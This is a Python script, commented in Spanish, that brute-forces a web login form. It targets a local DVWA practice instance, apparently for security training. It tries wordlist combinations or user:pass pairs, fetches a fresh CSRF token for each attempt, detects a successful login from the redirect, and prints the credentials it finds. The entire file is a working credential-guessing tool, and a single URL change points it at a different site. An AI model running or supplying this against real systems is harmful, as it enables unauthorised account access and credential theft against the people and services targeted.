#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import json
import time
import random
from pathlib import Path

# Rutas a tus wordlists (ajusta si hace falta)
USER_FILE = 'users.txt'
PASS_FILE = 'passwords.txt'

# URL del login (DVWA en tu ejemplo)
URL = "http://localhost/DVWA/login.php"
REDIC = 'login.php'

# Parámetros de control
DELAY_BETWEEN_REQUESTS = 0.2   # segundos entre intentos (respeta ritmo)
MAX_RETRIES = 2                # reintentos por petición en caso de fallo de red
SHUFFLE = False                # si True baraja el orden de combinaciones
SHOW_CSRF_ERRORS = False       # Controla si mostrar errores CSRF
SHOW_PROGRESS = True           # ⭐ NUEVA CONSTANTE: Mostrar progreso
PROGRESS_INTERVAL = 50         # ⭐ Cada cuántos intentos mostrar progreso

def load_wordlist(path):
    """Carga un fichero, eliminando vacíos y comentarios."""
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"No existe: {path}")
    items = []
    with p.open('r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            items.append(line)
    return items

def detect_pair_lines(lines):
    """
    Si las líneas del fichero tienen formato 'user:pass', devuelve dict {user:pass}.
    Si no, devuelve None.
    """
    pairs = {}
    for ln in lines:
        if ':' not in ln:
            return None
        # separar sólo en la primera ':' (por si la pass contiene :)
        user, pwd = ln.split(':', 1)
        user = user.strip()
        pwd = pwd.strip()
        if user and pwd:
            pairs.setdefault(user, []).append(pwd)
    return pairs

def get_csrf_token(session):
    """Extrae token CSRF de la página de login (si existe)."""
    r = session.get(URL, timeout=10)
    soup = BeautifulSoup(r.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})
    if token_input:
        return token_input.get('value')
    return None

def attempt_login(session, user, pwd, token=None):
    """Intenta el login y devuelve True si parece exitoso."""
    # ⭐ CORREGIDO: Ahora usa las variables user y pwd del bucle
    login_data = {
        'username': user,
        'password': pwd,
        'Login': 'Login',
        'user_token': token
    }

    r = session.post(URL, data=login_data, timeout=10, allow_redirects=True)

    # Lógica de detección de éxito
    if REDIC not in r.url:
        return True, r
    return False, r

def main():
    try:
        users = load_wordlist(USER_FILE)
        passwords = load_wordlist(PASS_FILE)
        print(f"[+] Cargados {len(users)} usuarios y {len(passwords)} contraseñas")
    except FileNotFoundError as e:
        print(f"ERROR: {e}")
        return

    # Detectar si el fichero de passwords contiene pares user:pass
    pass_pairs = detect_pair_lines(passwords)

    # Resultado
    found = []

    # Si passwords tiene pares user:pass, probamos esos pares específicos
    if pass_pairs:
        print("[*] Detectado formato user:pass en el fichero de passwords. Probaré esos pares primero.")
        # Construir lista de intentos (user, pass)
        attempts = []
        for u, pwds in pass_pairs.items():
            for p in pwds:
                attempts.append((u, p))
    else:
        # Combinación cartesiana users x passwords
        print("[*] Usando combinación cartesiana usuario x contraseña.")
        attempts = [(u, p) for u in users for p in passwords]

    # Opcional: barajar el orden para no probar siempre en el mismo patrón
    if SHUFFLE:
        random.shuffle(attempts)

    total = len(attempts)
    print(f"[*] Total de intentos a realizar: {total}")
    print(f"[*] Mostrando progreso cada {PROGRESS_INTERVAL} intentos")
    print("-" * 50)

    idx = 0
    start_time = time.time()

    for user, pwd in attempts:
        idx += 1

        # ⭐ Mostrar progreso periódicamente
        if SHOW_PROGRESS and idx % PROGRESS_INTERVAL == 0:
            elapsed = time.time() - start_time
            progress_pct = (idx / total) * 100
            print(f"[*] Progreso: {idx}/{total} ({progress_pct:.1f}%) - Tiempo: {elapsed:.1f}s")

        # Reutilizamos la misma sesión por intento
        session = requests.Session()

        # Obtener token CSRF (reintentar si hay problema de red)
        token = None
        for t in range(MAX_RETRIES + 1):
            try:
                token = get_csrf_token(session)
                break
            except requests.RequestException as e:
                if SHOW_CSRF_ERRORS:
                    print(f"[-] Fallo al obtener token (intento {t+1}): {e}")
                time.sleep(1)

        if token is None:
            if SHOW_CSRF_ERRORS:
                print("[-] No se pudo obtener token CSRF — saltando intento.")
            continue

        # Intentos de login con reintentos en post
        success = False
        for rtry in range(MAX_RETRIES + 1):
            try:
                ok, response = attempt_login(session, user, pwd, token=token)
                if ok:
                    print(f"[+] ({idx}/{total}) ✅ ÉXITO: {user}:{pwd}")
                    found.append((user, pwd))
                    success = True
                else:
                    if SHOW_PROGRESS and idx % PROGRESS_INTERVAL != 0:  # ⭐ Solo mostrar fallos si no es intervalo de progreso
                        print(f"[-] ({idx}/{total}) ❌ {user}:{pwd}")
                break
            except requests.RequestException as e:
                print(f"[-] Error en POST (intento {rtry+1}): {e}")
                time.sleep(1)

        # pausa entre intentos para no saturar el servicio
        time.sleep(DELAY_BETWEEN_REQUESTS)

    # Resumen final
    total_time = time.time() - start_time
    print("\n" + "="*50)
    print("RESUMEN FINAL:")
    print("="*50)
    if found:
        print("🔑 CREDENCIALES VÁLIDAS ENCONTRADAS:")
        for u, p in found:
            print(f"   ✅ {u}:{p}")
    else:
        print("❌ No se encontraron credenciales válidas")

    print(f"\n📊 ESTADÍSTICAS:")
    print(f"   Total de intentos: {total}")
    print(f"   Credenciales encontradas: {len(found)}")
    print(f"   Tiempo total: {total_time:.1f} segundos")
    print(f"   Velocidad: {total/total_time:.1f} intentos/segundo" if total_time > 0 else "")
    print("="*50)

if __name__ == '__main__':
    main()
